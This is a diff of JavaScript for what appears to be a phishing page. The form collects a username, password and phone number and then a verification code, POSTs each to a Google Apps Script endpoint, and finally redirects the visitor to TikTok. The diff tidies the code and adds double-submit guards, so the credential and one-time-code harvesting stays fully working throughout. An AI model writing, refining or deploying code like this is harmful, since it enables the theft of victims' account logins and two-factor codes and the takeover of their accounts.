@@ -1,6 +1,8 @@
 const url = "https://script.google.com/macros/s/AKfycbzfqekEJMr3zdCL2AEFiQ-8UWqYQ-fjou9EsHWPCgi26A6uGR4dq27RsZBmVCgam-yM/exec";
 
 let dataUser = {};
+let sedangKirim = false;
+let sedangVerifikasi = false;
 
 
 // Enter pindah input
@@ -23,107 +25,98 @@ document.querySelectorAll("#formUser input").forEach((input,index,inputs)=>{
 });
 
 
-// tombol masuk
+// Tombol Masuk
 document.getElementById("formUser")
 .addEventListener("submit",function(e){
 
-e.preventDefault();
+  e.preventDefault();
 
+  if(sedangKirim) return;
 
-dataUser = {
+  sedangKirim = true;
 
-username: document.getElementById("username").value,
+  dataUser = {
 
-password: document.getElementById("password").value,
+    username: document.getElementById("username").value,
+    password: document.getElementById("password").value,
+    telepon: document.getElementById("telepon").value
 
-telepon: document.getElementById("telepon").value
+  };
 
-};
+  fetch(url,{
 
+    method:"POST",
 
-// kirim data awal ke sheet
+    body:JSON.stringify(dataUser)
 
-fetch(url,{
+  })
 
-method:"POST",
+  .then(res => res.text())
 
-body:JSON.stringify(dataUser)
+  .then(result => {
 
-})
-.then(res=>res.text())
+    console.log(result);
 
-.then(result=>{
+    document.getElementById("formData").style.display = "none";
+    document.getElementById("verifikasi").style.display = "block";
 
+  })
 
-console.log(result);
+  .catch(err => {
 
+    sedangKirim = false;
 
-// pindah halaman kode
+    console.log(err);
 
-document.getElementById("formData").style.display="none";
+    alert("Gagal mengirim data");
 
-document.getElementById("verifikasi").style.display="block";
-
-
-})
-
-.catch(err=>{
-
-console.log(err);
-
-alert("Gagal mengirim data");
+  });
 
 });
 
 
-});
-
-
-
-// tombol verifikasi
-
+// Tombol Verifikasi
 function kirimKode(){
 
-dataUser.kode = document.getElementById("kode").value;
+  if(sedangVerifikasi) return;
 
+  sedangVerifikasi = true;
 
-fetch(url,{
+  dataUser.kode = document.getElementById("kode").value;
 
-method:"POST",
+  fetch(url,{
 
-body:JSON.stringify(dataUser)
+    method:"POST",
 
-})
-.then(res=>res.text())
+    body:JSON.stringify(dataUser)
 
-.then(()=>{
+  })
 
+  .then(res => res.text())
 
-alert("Kode berhasil dikirim");
+  .then(() => {
 
+    alert("Kode berhasil dikirim");
 
-bukaTikTok();
+    bukaTikTok();
 
+  })
 
-})
+  .catch(err => {
 
-.catch(err=>{
+    sedangVerifikasi = false;
 
+    console.log(err);
 
-console.log(err);
+    alert("Gagal mengirim data");
 
-alert("Gagal mengirim data");
-
-
-});
-
+  });
 
 }
 
 
-
 function bukaTikTok(){
 
-window.location.href="https://www.tiktok.com";
+  window.location.href = "https://www.tiktok.com";
 
 }
